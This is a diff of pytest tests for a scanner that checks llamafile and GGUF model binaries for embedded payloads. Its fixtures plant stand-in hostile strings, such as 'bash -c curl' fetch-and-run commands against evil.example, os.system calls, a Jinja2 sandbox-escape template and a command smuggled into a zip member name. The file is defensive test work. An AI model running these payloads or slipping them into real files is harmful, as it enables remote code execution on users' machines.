+                ("general.description", "bash -c curl http://model-data.example/payload.sh"),
+            ]
+        ),
+    )
+
+    result = LlamafileScanner(config={"gguf_max_metadata_keys": 1}).scan(str(binary))
+
+    assert result.success is False
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert result.metadata["embedded_payload_boundary_source"] == "zip_member"
+    assert LLAMAFILE_GGUF_ANALYSIS_INCOMPLETE_REASON in result.metadata["scan_outcome_reasons"]
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_stops_runtime_before_trusted_zip_member_header(tmp_path: Path) -> None:
+    binary = tmp_path / "ape-command-like-zip-member.llamafile"
+    _write_ape_zip_llamafile(
+        binary,
+        _build_gguf_string_metadata([("general.architecture", "llama")]),
+        member_name="bash -c socket/model.gguf",
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["embedded_payload_boundary_source"] == "zip_member"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_fails_closed_for_compressed_zip_gguf_polyglot_coverage(tmp_path: Path) -> None:
+    binary = tmp_path / "ape-compressed-gguf.llamafile"
+    embedded = (
+        b"GGUF"
+        + struct.pack("<IQQ", 3, 0, 0)
+        + (b"\x00" * 128)
+        + _build_gguf_string_metadata([("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")])
+    )
+    _write_ape_zip_llamafile(
+        binary,
+        embedded,
+        member_name="bash -c socket/model.gguf",
+        compression=zipfile.ZIP_DEFLATED,
+    )
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert LLAMAFILE_GGUF_ZIP_MEMBER_INCOMPLETE_REASON in direct.metadata["scan_outcome_reasons"]
+    checks = [check for check in direct.checks if check.name == "Llamafile Embedded ZIP GGUF Polyglot Coverage"]
+    assert len(checks) == 1
+    assert checks[0].message == "Embedded ZIP GGUF member could not be fully probed for trailing polyglot payloads"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "compressed-gguf-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_scanner_scans_trailing_gguf_inside_stored_zip_member(tmp_path: Path) -> None:
+    binary = tmp_path / "ape-stored-gguf-polyglot.llamafile"
+    embedded = (
+        b"GGUF"
+        + struct.pack("<IQQ", 3, 0, 0)
+        + (b"\x00" * 128)
+        + _build_gguf_string_metadata([("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")])
+    )
+    _write_ape_zip_llamafile(binary, embedded)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_does_not_trust_zip_boundary_inside_executable_mapping(tmp_path: Path) -> None:
+    binary = tmp_path / "mapped-overlapping-zip.llamafile"
+    with zipfile.ZipFile(binary, "w", compression=zipfile.ZIP_STORED) as archive:
+        archive.writestr(
+            "weights/model.gguf",
+            b"GGUF"
+            + struct.pack("<IQQ", 3, 0, 0)
+            + (b"\x00" * (32 * 1024))
+            + b"bash -c curl http://evil.example/payload.sh"
+            + (b"\x00" * (40 * 1024)),
+        )
+    archive_bytes = binary.read_bytes()
+    prefix_size = 4096
+    prefix = bytearray(prefix_size)
+    header = _build_mapped_executable_header("elf", 64 * 1024)
+    prefix[: len(header)] = header
+    prefix[1024 : 1024 + len(b"llamafile runtime\n")] = b"llamafile runtime\n"
+    binary.write_bytes(bytes(prefix) + archive_bytes)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["embedded_payload_boundary_trusted"] is False
+    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_does_not_trust_ape_gguf_decoy_before_embedded_elf(tmp_path: Path) -> None:
+    binary = tmp_path / "ape-early-gguf-decoy.llamafile"
+    blob = bytearray(64 * 1024)
+    outer_header = bytearray(_build_mapped_executable_header("pe", 4096))
+    outer_header[:6] = b"MZqFpD"
+    blob[: len(outer_header)] = outer_header
+    blob[1024 : 1024 + len(b"llamafile runtime\n")] = b"llamafile runtime\n"
+    fake_embedded_elf = _build_mapped_executable_header("elf", 2048)
+    blob[6000 : 6000 + len(fake_embedded_elf)] = fake_embedded_elf
+    blob[8192 : 8192 + 24] = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
+    embedded_elf = _build_mapped_executable_header("elf", 32 * 1024, elf_machine=183)
+    blob[16 * 1024 : 16 * 1024 + len(embedded_elf)] = embedded_elf
+    malicious_runtime = b"bash -c curl http://evil.example/payload.sh"
+    blob[24 * 1024 : 24 * 1024 + len(malicious_runtime)] = malicious_runtime
+    binary.write_bytes(blob)
+
+    result = LlamafileScanner(config={"llamafile_preview_bytes": 64}).scan(str(binary))
+
+    assert result.metadata["embedded_payload_boundary_trusted"] is False
+    assert any(
+        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_scans_runtime_after_gguf_in_bounded_ape_search(tmp_path: Path) -> None:
+    binary = tmp_path / "bounded-ape-runtime-after-gguf.llamafile"
+    _write_ape_raw_llamafile(
+        binary,
+        file_size=128 * 1024,
+        gguf_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        runtime_offset=28 * 1024,
+        runtime=b"bash -c curl http://evil.example/payload.sh",
+        later_elf_offset=64 * 1024,
+    )
+
+    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 32 * 1024, "llamafile_preview_bytes": 64}).scan(
+        str(binary)
+    )
+
+    assert result.metadata["embedded_payload_boundary_trusted"] is False
+    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_trusts_complete_ape_mapping_search_before_benign_gguf(tmp_path: Path) -> None:
+    binary = tmp_path / "complete-ape-benign-gguf.llamafile"
+    payload_offset = _write_ape_raw_llamafile(
+        binary,
+        file_size=32 * 1024,
+        gguf_payload=_build_gguf_string_metadata(
+            [("general.description", "bash -c curl http://model-data.example/payload.sh")]
+        ),
+    )
+
+    result = LlamafileScanner(
+        config={"llamafile_payload_scan_bytes": binary.stat().st_size, "llamafile_preview_bytes": 64}
+    ).scan(str(binary))
+
+    assert result.success is True
+    assert result.metadata["embedded_payload_offset"] == payload_offset
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert result.metadata["embedded_payload_boundary_source"] == "executable_mapping"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_fails_closed_for_incomplete_ape_mapping_search(tmp_path: Path) -> None:
+    binary = tmp_path / "bounded-ape-unscanned-runtime.llamafile"
+    _write_ape_raw_llamafile(
+        binary,
+        file_size=128 * 1024,
+        gguf_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        runtime_offset=96 * 1024,
+        runtime=b"bash -c curl http://evil.example/payload.sh",
+        later_elf_offset=64 * 1024,
+    )
+    config = {"llamafile_payload_scan_bytes": 32 * 1024, "llamafile_preview_bytes": 64}
+
+    direct = LlamafileScanner(config=config).scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["embedded_payload_boundary_trusted"] is False
+    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    payload_checks = [check for check in direct.checks if check.name == "Llamafile Embedded Payload Coverage"]
+    assert len(payload_checks) == 1
+    assert payload_checks[0].message == "Embedded payload discovery stopped at the bounded scan window"
+    runtime_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Coverage"]
+    assert len(runtime_checks) == 1
+    assert runtime_checks[0].message == "Executable runtime extends beyond the bounded streaming scan window"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)
+
+    aggregate = scan_model_directory_or_file(
+        str(binary),
+        cache_scan_results=False,
+        llamafile_payload_scan_bytes=32 * 1024,
+        llamafile_preview_bytes=64,
+    )
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "bounded-ape-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+            llamafile_payload_scan_bytes=32 * 1024,
+            llamafile_preview_bytes=64,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+@pytest.mark.parametrize("executable_format", ["elf", "ape"])
+def test_llamafile_scanner_accepts_large_raw_payload_after_trusted_mapping(
+    tmp_path: Path,
+    executable_format: str,
+) -> None:
+    binary = tmp_path / f"large-raw-{executable_format}.llamafile"
+    embedded_payload = b"GGUF" + struct.pack("<IQQ", 3, 0, 0) + (b"\x00" * (2 * 1024 * 1024))
+    _write_sparse_mapped_llamafile(
+        binary,
+        "pe" if executable_format == "ape" else executable_format,
+        embedded_payload=embedded_payload,
+    )
+    if executable_format == "ape":
+        with binary.open("r+b") as handle:
+            handle.write(b"MZqFpD")
+            handle.seek(8 * 1024 * 1024)
+            handle.write(_build_mapped_executable_header("elf", 1024 * 1024, elf_machine=183))
+
+    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": binary.stat().st_size}).scan(str(binary))
+
+    assert result.success is True
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON not in result.metadata.get("scan_outcome_reasons", [])
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON not in result.metadata.get("scan_outcome_reasons", [])
+
+
+def test_llamafile_scanner_propagates_trusted_embedded_gguf_inconclusive_state(tmp_path: Path) -> None:
+    binary = tmp_path / "inconclusive-appended-gguf.llamafile"
+    payload_offset = _write_sparse_mapped_llamafile(
+        binary,
+        "elf",
+        embedded_payload=_build_gguf_string_metadata(
+            [
+                ("general.architecture", "llama"),
+                ("general.description", "bash -c curl http://evil.example/payload.sh"),
+            ]
+        ),
+    )
+
+    direct = LlamafileScanner(config={"gguf_max_metadata_keys": 1}).scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["embedded_payload_offset"] == payload_offset
+    assert direct.metadata["embedded_payload_boundary_trusted"] is True
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_GGUF_ANALYSIS_INCOMPLETE_REASON in direct.metadata["scan_outcome_reasons"]
+    assert "gguf_metadata_limit_exceeded" in direct.metadata["embedded_gguf_metadata"]["scan_outcome_reasons"]
+    resource_checks = [
+        check for check in direct.checks if check.name == "Llamafile Embedded GGUF Metadata Resource Limits"
+    ]
+    assert len(resource_checks) == 1
+    assert resource_checks[0].message == "File declares 2 metadata keys, exceeding limit 1"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)
+
+    aggregate = scan_model_directory_or_file(
+        str(binary),
+        gguf_max_metadata_keys=1,
+        cache_scan_results=False,
+    )
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "embedded-gguf-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            gguf_max_metadata_keys=1,
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_runtime_evidence_retention_is_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
+    blob = b"\x00".join(f"curl http://evil-{index:04}.example/payload".encode() for index in range(100))
+    redaction_calls = 0
+    original_redact = llamafile_scanner_module.redact_evidence_string
+
+    def counting_redact(text: str, max_chars: int | None = 180) -> str:
+        nonlocal redaction_calls
+        redaction_calls += 1
+        return original_redact(text, max_chars=max_chars)
+
+    monkeypatch.setattr(llamafile_scanner_module, "redact_evidence_string", counting_redact)
+
+    (
+        command_hits,
+        network_hits,
+        string_scan_limited,
+        candidate_scan_limited,
+        transfer_token_scan_limited,
+        transfer_option_ambiguous,
+        interpreter_token_scan_limited,
+        command_attempts,
+        network_attempts,
+        candidates_scanned,
+        correlated_signal_seen,
+    ) = LlamafileScanner()._runtime_string_hits(blob)
+
+    assert len(command_hits) == LLAMAFILE_RUNTIME_MAX_EVIDENCE
+    assert len(network_hits) == LLAMAFILE_RUNTIME_MAX_EVIDENCE
+    assert sorted(command_hits) == sorted(network_hits)
+    assert string_scan_limited is False
+    assert candidate_scan_limited is False
+    assert transfer_token_scan_limited is False
+    assert transfer_option_ambiguous is False
+    assert interpreter_token_scan_limited is False
+    assert command_attempts == LLAMAFILE_RUNTIME_MAX_EVIDENCE
+    assert network_attempts == LLAMAFILE_RUNTIME_MAX_EVIDENCE
+    assert candidates_scanned == 100
+    assert correlated_signal_seen is True
+    assert redaction_calls == LLAMAFILE_RUNTIME_MAX_EVIDENCE
+
+
+def test_llamafile_remote_transfer_short_circuits_repeated_command_contexts(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    context_calls = 0
+    original_context = llamafile_scanner_module._transfer_command_context
+
+    def counting_context(*args: Any, **kwargs: Any) -> tuple[bool, int | None, bool, bool]:
+        nonlocal context_calls
+        context_calls += 1
+        return original_context(*args, **kwargs)
+
+    monkeypatch.setattr(llamafile_scanner_module, "_transfer_command_context", counting_context)
+
+    signals = llamafile_scanner_module._runtime_text_signals(" ".join(["curl internal-host"] * 64))
+
+    assert signals == (True, True, False, False, False)
+    assert context_calls == 1
+
+    context_calls = 0
+    signals = llamafile_scanner_module._runtime_text_signals(" ".join(["echo curl internal-host"] * 64))
+
+    assert signals == (False, False, False, False, False)
+    assert context_calls == 1
+
+
+def test_llamafile_scanner_marks_omitted_runtime_bytes_inconclusive(tmp_path: Path) -> None:
+    binary = tmp_path / "bounded-runtime-preview-gap.llamafile"
+    _write_sparse_runtime_gap_llamafile(binary, b"bash -c curl http://evil.example/payload.sh")
+
+    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 3 * 1024 * 1024}).scan(str(binary))
+
+    assert result.success is False
+    assert result.metadata.get("analysis_incomplete") is True
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in result.metadata.get("scan_outcome_reasons", [])
+    coverage_checks = [check for check in result.checks if check.name == "Llamafile Runtime Coverage"]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].severity == IssueSeverity.INFO
+    assert coverage_checks[0].message == "Executable runtime extends beyond the bounded streaming scan window"
+    assert coverage_checks[0].details.get("analysis_incomplete") is True
+    assert coverage_checks[0].details.get("runtime_bytes_omitted") == 9 * 1024 * 1024
+
+    aggregate = scan_model_directory_or_file(
+        str(binary),
+        llamafile_payload_scan_bytes=3 * 1024 * 1024,
+        cache_scan_results=False,
+    )
+    metadata = aggregate.file_metadata[str(binary)]
+    assert aggregate.success is False
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in metadata.get("scan_outcome_reasons", [])
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "runtime-coverage-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            llamafile_payload_scan_bytes=3 * 1024 * 1024,
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        cached_metadata = cached_aggregate.file_metadata[str(binary)]
+        assert cached_aggregate.success is False
+        assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in cached_metadata.get("scan_outcome_reasons", [])
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_scanner_does_not_rescan_out_of_context_tail_heredoc_preview(tmp_path: Path) -> None:
+    binary = tmp_path / "bounded-literal-heredoc-tail.llamafile"
+    with binary.open("wb") as handle:
+        handle.write(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56)
+        handle.write(b'llamafile runtime\ncat <<"EOF"\n')
+        handle.seek(10 * 1024 * 1024)
+        handle.write(b"curl internal-host\nEOF\n")
+        handle.seek((12 * 1024 * 1024) - 1)
+        handle.write(b"\x00")
+
+    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 3 * 1024 * 1024}).scan(str(binary))
+
+    assert result.success is False
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in result.metadata.get("scan_outcome_reasons", [])
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
 
 
 def test_llamafile_scanner_does_not_route_middle_near_match_in_exe(tmp_path: Path) -> None:
@@ -240,6 +1390,43 @@ def test_llamafile_bounds_torch7_scan_attempts_after_marker_decoys(
         and check.severity == IssueSeverity.WARNING
         for check in result.checks
     )
+
+
+def test_llamafile_fails_closed_when_torch7_marker_probe_limit_is_exceeded(tmp_path: Path) -> None:
+    binary = tmp_path / "torch7-marker-probe-limit.llamafile"
+    decoys = b"T7\x00\x00" * (LLAMAFILE_TORCH7_MAX_MARKER_CANDIDATES + 1)
+    binary.write_bytes(_build_llamafile_blob(embedded_payload=decoys))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_TORCH7_CANDIDATE_PROBE_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_check = next(
+        check for check in direct.checks if check.name == "Llamafile Embedded Torch7 Candidate Coverage"
+    )
+    assert coverage_check.message == (
+        f"Stopped embedded Torch7 analysis after {LLAMAFILE_TORCH7_MAX_MARKER_CANDIDATES} candidate markers"
+    )
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "torch7-marker-probe-limit-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
 
 
 def test_llamafile_finds_torch7_in_initial_payload_pass_while_skipping_marker_decoys(
@@ -787,6 +1974,561 @@ def test_llamafile_runtime_preview_read_failure_is_inconclusive_not_security_fin
         reset_cache_manager()
 
 
+@pytest.mark.parametrize(
+    ("read_error", "expected_message"),
+    [
+        (
+            OSError("simulated runtime stream failure"),
+            "Failed reading runtime stream bytes: simulated runtime stream failure",
+        ),
+        (None, "Runtime stream ended before the expected executable boundary"),
+    ],
+)
+def test_llamafile_runtime_stream_failures_are_inconclusive_and_not_cached(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    read_error: OSError | None,
+    expected_message: str,
+) -> None:
+    binary = tmp_path / "runtime-stream-failure.llamafile"
+    binary.write_bytes(_build_llamafile_blob())
+
+    def incomplete_stream(
+        _self: LlamafileScanner,
+        _path: Path,
+        end_offset: int,
+        _preview_blobs: list[bytes],
+        _result: ScanResult,
+        *,
+        include_preview_fallback: bool,
+    ) -> tuple[int, OSError | None, bool, bool, bool, bool, bool, bool]:
+        assert include_preview_fallback is False
+        return max(0, end_offset - 1), read_error, False, False, False, False, False, False
+
+    monkeypatch.setattr(LlamafileScanner, "_scan_runtime_strings_streaming", incomplete_stream)
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_STREAM_READ_REASON in direct.metadata["scan_outcome_reasons"]
+    read_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Stream Read"]
+    assert len(read_checks) == 1
+    assert read_checks[0].message == expected_message
+    assert read_checks[0].details["scan_outcome_reason"] == LLAMAFILE_RUNTIME_STREAM_READ_REASON
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / f"runtime-stream-cache-{'error' if read_error else 'short'}"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_runtime_stream_failure_retains_only_pre_boundary_preview_findings(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    binary = tmp_path / "trusted-boundary-stream-failure.llamafile"
+    _write_ape_zip_llamafile(
+        binary,
+        _build_gguf_string_metadata([("general.description", "bash -c curl http://model-data.example/payload.sh")]),
+        runtime=b"bash -c curl http://runtime-evil.example/payload.sh",
+    )
+
+    def fail_after_previews(
+        self: LlamafileScanner,
+        path: Path,
+        _end_offset: int,
+        preview_blobs: list[bytes],
+        result: ScanResult,
+        *,
+        include_preview_fallback: bool,
+    ) -> tuple[int, OSError | None, bool, bool, bool, bool, bool, bool]:
+        assert include_preview_fallback is False
+        preview = b"\n".join(preview_blobs)
+        assert b"runtime-evil.example" in preview
+        assert b"model-data.example" not in preview
+        self._scan_runtime_strings(str(path), preview, result)
+        return 0, OSError("simulated trusted-boundary stream failure"), False, False, False, False, False, False
+
+    monkeypatch.setattr(LlamafileScanner, "_scan_runtime_strings_streaming", fail_after_previews)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.success is False
+    assert LLAMAFILE_RUNTIME_STREAM_READ_REASON in result.metadata["scan_outcome_reasons"]
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert len(runtime_checks) == 1
+    assert runtime_checks[0].severity == IssueSeverity.CRITICAL
+    assert "runtime-evil.example" in repr(runtime_checks[0].details)
+    assert "model-data.example" not in repr(runtime_checks[0].details)
+
+
+def test_llamafile_long_runtime_string_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "oversized-runtime-string.llamafile"
+    _write_sparse_runtime_gap_llamafile(binary, b"A" * (LLAMAFILE_RUNTIME_STREAM_MAX_STRING_BYTES + 1))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_STRING_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime String Coverage"]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].message == "Runtime printable string exceeded the bounded cross-chunk analysis window"
+    assert coverage_checks[0].details["max_string_bytes"] == LLAMAFILE_RUNTIME_STREAM_MAX_STRING_BYTES
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "runtime-string-limit-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_transfer_token_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "transfer-token-limit.llamafile"
+    hidden_transfer = "curl " + ("--silent " * LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS)
+    hidden_transfer += "https://evil.example/payload"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[hidden_transfer]))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_TRANSFER_TOKEN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Transfer Command Coverage"]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].message == "Runtime transfer command exceeded the bounded token analysis limit"
+    assert coverage_checks[0].details["max_tokens"] == LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "transfer-token-limit-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_transfer_command_preprocessing_is_bounded() -> None:
+    runtime_text = "echo curl internal-host ; " * 1_600
+
+    _, _, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert token_scan_limited is True
+
+
+def test_llamafile_shell_stdin_pipeline_parsing_is_bounded() -> None:
+    runtime_text = "curl internal-host " + ("| x " * (LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS + 1))
+
+    _, _, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert token_scan_limited is True
+
+
+def test_llamafile_shell_printf_output_is_bounded() -> None:
+    output, truncated = llamafile_scanner_module._shell_printf_output("curl %s " + ("x" * 4096), ["host"] * 1000)
+
+    assert len(output) == LLAMAFILE_RUNTIME_MAX_TRANSFER_CONTEXT_BYTES
+    assert output.startswith("curl host ")
+    assert truncated is True
+
+
+def test_llamafile_shell_printf_payload_truncation_is_inconclusive() -> None:
+    runtime_text = "printf '" + (" " * 33_000) + "%s\\n' x 'curl internal-host' | bash"
+
+    command, network, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert command is False
+    assert network is False
+    assert token_scan_limited is True
+
+
+def test_llamafile_python_line_is_parsed_once(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    runtime_text = "values = [" + ",".join(["'curl internal-host'"] * 64) + "]; marker = os.system"
+    parse_calls = 0
+    original_parse = llamafile_scanner_module.ast.parse
+
+    def counting_parse(*args: Any, **kwargs: Any) -> Any:
+        nonlocal parse_calls
+        parse_calls += 1
+        return original_parse(*args, **kwargs)
+
+    monkeypatch.setattr(llamafile_scanner_module.ast, "parse", counting_parse)
+
+    assert llamafile_scanner_module._runtime_text_signals(runtime_text)[:2] == (False, False)
+    assert parse_calls == 1
+
+
+def test_llamafile_python_ast_byte_columns_are_normalized() -> None:
+    runtime_text = ("\N{LATIN SMALL LETTER E WITH ACUTE}" * 12) + "=1; os.system('curl internal-host')"
+
+    command, network, _, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert command is True
+    assert network is True
+
+
+def test_llamafile_streams_utf8_python_execution_across_chunk_boundary(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    runtime_text = ("\N{LATIN SMALL LETTER E WITH ACUTE}" * 12) + "=1; os.system('curl internal-host')"
+    binary = tmp_path / "utf8-python-execution.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_text]))
+    monkeypatch.setattr(llamafile_scanner_module, "LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES", 89)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert any(check.severity == IssueSeverity.CRITICAL for check in runtime_checks)
+    assert any(check.details.get("correlated_evidence") for check in runtime_checks)
+
+
+def test_llamafile_utf8_python_string_near_match_stays_clean(tmp_path: Path) -> None:
+    runtime_text = ("\N{LATIN SMALL LETTER E WITH ACUTE}" * 12) + '=1; value="os.system curl internal-host"'
+    binary = tmp_path / "utf8-python-string.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_text]))
+
+    result = LlamafileScanner().scan(str(binary))
+
